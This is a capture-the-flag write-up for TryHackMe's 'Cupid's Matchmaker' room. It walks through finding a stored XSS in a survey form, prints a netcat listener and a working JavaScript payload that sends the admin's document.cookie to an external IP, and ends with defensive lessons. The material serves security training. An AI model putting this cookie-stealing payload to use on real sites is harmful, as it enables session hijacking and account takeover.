# TryHackMe – Cupid’s Matchmaker Writeup

## 1. Introduction

Cupid’s Matchmaker is a beginner-friendly web challenge from TryHackMe’s “Love At First Breach 2026” event that focuses on exploiting a stored XSS vulnerability to steal an admin cookie.  
The scenario is a matchmaking site that promises “no AI, just real humans reading your personality survey,” hinting that a privileged user will later view your submitted content.  
The goal is to inject JavaScript into the survey form so that, when the “human reviewer” (admin/bot) opens it, your payload runs in their browser and exfiltrates their session cookie, which serves as the flag.

---

## 2. Environment Setup and Initial Recon

After starting the room:

- I connected to TryHackMe using the AttackBox/VPN.
- I opened the Cupid’s Matchmaker web application from the room’s access link.
- I browsed the homepage to understand the flow:
  - Fill out a personality survey.
  - A human “expert” reviews it.
  - You get matched later.

The key detail is that the submission will be reviewed later by someone else.  
This suggests a stored XSS opportunity: my input might be stored and then rendered in another user’s (admin) browser.

I also clicked around to see all accessible pages (home, survey) and confirmed that the main interactive component is the survey form itself.  
(Optionally, you can note that basic directory fuzzing didn’t reveal anything more interesting than the main app.)

---

## 3. Analysing the Survey Form

Clicking **“Take survey”** opens a form asking for various details such as:

- Name and basic profile info.
- Preferences and what you’re looking for.
- A free-text area (e.g., “Tell us about yourself” / “Describe your ideal partner”).

These free-text fields are prime injection points, because they often accept arbitrary input and are later displayed somewhere else in the application.

Based on the room description and the survey structure, my hypothesis was:

- Survey answers are stored on the server.
- A reviewer (admin/bot) opens a page that displays those answers.
- If the application does not properly encode user input, any HTML/JavaScript I submit could execute in the reviewer’s browser.
- If that JavaScript can access `document.cookie`, I can send the admin’s cookie to my own machine.

This is a classic stored XSS scenario.

---

## 4. Testing for Stored XSS

To confirm that stored XSS is possible:

1. I filled in all required fields with normal data.
2. In a free-text field (such as “About you”), I injected a basic XSS test payload:

   ```html
   <script>alert('XSS');</script>
I submitted the survey and got a confirmation message saying the team would review my submission.

As the normal user, I did not see the alert box, which is expected for stored XSS.
The payload is likely stored in the database and only executed when someone else (the reviewer) opens the submission.

This matches the usual pattern of stored XSS: the malicious script is saved on the server and executed later in another user’s browser.

5. Setting Up a Listener for Cookie Theft
Once I suspected stored XSS in the reviewer view, the next step was to steal the admin’s session cookie when they load my submission.

First, I prepared a listener on my machine:

For this writeup, I use a dummy public IP: 203.0.113.10.
In a real run, this would be your own VPN/AttackBox IP (e.g., from ifconfig on tun0).

I started a netcat listener on port 8080:

bash
nc -lvnp 8080
This listener will capture any incoming HTTP request.
The plan is to have the admin’s browser automatically send a request to http://203.0.113.10:8080 with their cookie attached as a URL parameter.

6. Crafting the Final Stored XSS Payload
With the listener running, I created a payload that exfiltrates the admin’s cookie via a simple HTTP request.

I used an Image object to avoid CORS-related issues and keep the payload simple:

xml
<script>
  new Image().src = 'http://203.0.113.10:8080/?c=' + document.cookie;
</script>
Explanation:

new Image() creates an image object in the browser.

Setting .src makes the browser issue a GET request to the specified URL.

I append document.cookie to the c query parameter, so the request looks like:
GET /?c=<cookie_here> HTTP/1.1 on my listener.

Steps:

I returned to the Cupid’s Matchmaker survey page.

Filled the required fields again with any values.

Placed the payload above into a free-text field (e.g., “About you”).

Submitted the survey and waited for the reviewer to “check” my response.

When the admin/bot opened my submission, the script executed in their browser context and sent their cookie to my netcat listener.

On my terminal running nc, I saw a request similar to:

text
GET /?c=session=FLAG_VALUE_HERE HTTP/1.1
Host: 203.0.113.10:8080
User-Agent: Mozilla/5.0 ...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
...
The critical part is the c parameter in the URL:

text
/?c=session=FLAG_VALUE_HERE
The value after session= (or whatever the cookie name is) is the admin’s cookie, which the room uses as the flag.

7. Submitting the Flag
After capturing the request:

I extracted the cookie/flag value from the line starting with GET /?c=....

I copied just the flag portion (e.g., FLAG_VALUE_HERE).

I pasted it into the answer box for the Cupid’s Matchmaker room on TryHackMe.

The submission was accepted, completing the challenge.

8. Lessons Learned
Key takeaways from this room:

Stored XSS impact
Stored XSS is more dangerous than simple reflected XSS because the payload persists on the server and executes in other users’ browsers, often with higher privileges (such as admins or moderators).

High-value targets
Features involving “human review,” moderation, or admin dashboards are high-risk if user-generated content is rendered without proper HTML escaping.

Cookie theft via XSS
Stealing cookies via XSS is straightforward when:

Cookies are not marked HttpOnly, allowing JavaScript to read document.cookie.

There is no restrictive Content Security Policy (CSP) to limit exfiltration.

Defenses
To mitigate this kind of vulnerability, developers should:

Properly encode and sanitize all user-controlled data before inserting it into HTML, attributes, or JavaScript context.

Use HttpOnly and Secure flags on session cookies.

Implement a CSP to limit where scripts can load from and send data.

From a learning perspective, Cupid’s Matchmaker is useful for practicing:

Spotting stored XSS opportunities from application logic and challenge descriptions.

Writing simple but effective XSS payloads for cookie exfiltration.

Setting up listeners and reading raw HTTP requests in a web exploitation scenario.

